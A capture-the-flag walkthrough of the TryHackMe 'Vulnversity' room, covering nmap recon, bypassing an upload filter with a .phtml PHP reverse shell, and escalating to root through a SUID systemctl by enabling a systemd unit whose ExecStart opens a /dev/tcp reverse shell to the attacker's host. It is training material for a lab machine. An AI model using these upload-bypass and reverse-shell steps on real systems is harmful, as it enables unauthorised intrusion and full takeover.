# Vuln University

[Play](https://tryhackme.com/room/vulnversity)

## Task 1 - Deploy the machine
ezpz

## Task 2 - Recon

classic nmap scan
```
❯ nmap -sC -sV -A 10.10.197.89
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST
Nmap scan report for 10.10.197.89
Host is up (0.18s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-03-07T21:43:45-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-08T02:43:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds
```

### Scan the box, how many ports are open?
`6`

### What version of the squid proxy is running on the machine?
`3.5.12`

### How many ports will nmap scan if the flag -p-400 was used?
`400`
(bruh)

### Using the nmap flag -n what will it not resolve?
`dns`

### What is the most likely operating system this machine is running?
`ubuntu`

### What port is the web server running on?
`3333`

### Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
ok

## Task 3 - Locating directories using gobuster
(have not included the gobuster scan results, since its pretty basic)

### What is the directory that has an upload form page?
`/internal/`

## Task 4 - Compromise the webserver
We see the option to upload the files. The default way to try and upload the `phpreverseshell.php` files, but apparently `.php` is not allowed. 

At this point, the room suggests using burpsuite to intercept the requests, and try out different php extensions. However, its more simple to just do it by hand :D

### Run this attack, what extension is allowed?
`phtml`

Once you have the `phprevshell.phtml` uploaded, go to `/include/uploads/phprevshell.phtml` and setup netcat in parallel. Once you get in, get a proper shell by doing `python3 -c "import pty; pty.spawn('/bin/bash')`. For the next question, just do `cat /etc/passwd`.

### What is the name of the user who manages the webserver?
`bill`

### What is the user flag?
{hmmmmmmmmmmmmmmmmmmmmmmmm}

## Task 5 - Priviledge Escalation

> In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

> For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

Using the command `find`, we get:

### On the system, search for all SUID files. What file stands out?
`/bin/systemctl`

### Become root and get the last flag (/root/root.txt)

For this privesc, I followed [Alvin Smith's Privilege Escalation](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)

Here are the steps:
1. create a `root.service` file on your machine with the details
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.150.214/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

2. Using the upload option in the `/internal/` directory of the website, upload this file. It'll throw and error of the extension as not permitted. Change `root.service` to `root.phtml` (why?) and you should be good to go.
3. In the target machine, just rename the file again.
4. Instead of 2, 3, you can also use `nc` or any other methods you prefer.
5. Run `/bin/systemctl enable /var/www/html/internal/uploads/root.service`
6. Start `nc` on your machine, on the port you set in the `root.service` file in step  1 (9999 here)
7. Run `/bin/systemctl start root.service`
8. PWN


```
www-data@vulnuniversity:/var/www/html/internal/uploads$ cat root.service
cat root.service
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.150.214/9999 0>&1'

[Install]
WantedBy=multi-user.target
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable /var/www/html/internal/uploads/root.service
<s$ /bin/systemctl enable /var/www/html/internal/uploads/root.service        
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service.
Created symlink from /etc/systemd/system/root.service to /var/www/html/internal/uploads/root.service.
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl start root.service
<r/www/html/internal/uploads$ /bin/systemctl start root.service 
```


```
❯ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.185.229] 43756
bash: cannot set terminal process group (1792): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# whoami
whoami
root
root@vulnuniversity:/# cd /root
cd /root
root@vulnuniversity:~# ls
ls
root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
{hell yeah}
root@vulnuniversity:~# 
```
